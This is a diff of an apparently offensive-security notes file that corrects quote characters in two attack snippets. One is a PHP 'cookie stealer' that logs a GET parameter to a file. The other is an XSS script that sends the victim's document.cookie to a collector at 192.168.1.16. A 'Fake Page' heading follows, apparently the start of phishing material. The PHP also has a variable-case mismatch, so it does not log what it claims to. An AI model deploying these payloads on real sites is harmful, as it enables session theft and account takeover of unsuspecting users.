@@ -17,15 +17,15 @@
 - Cookie Stealer (PHP for Apache web server)
 ```PHP
 <?php
-$Cookie=$_GET[‘txt’];
-$log=”Cookie=$cookie\r\n”;
-$f=fopen(“log.txt”,”a”);
+$Cookie=$_GET['txt'];
+$log="Cookie=$cookie\r\n";
+$f=fopen("log.txt","a");
 fwrite($f,$log);
 ?>
 ```
 - XSS Payload
 ```javascript
-<script>window.location=”http://192.168.1.16/cookie1.php?txt=” + document.cookie;</script>
+<script>window.location="http://192.168.1.16/cookie1.php?txt=" + document.cookie;</script>
 ```
 ### Fake Page
 - g
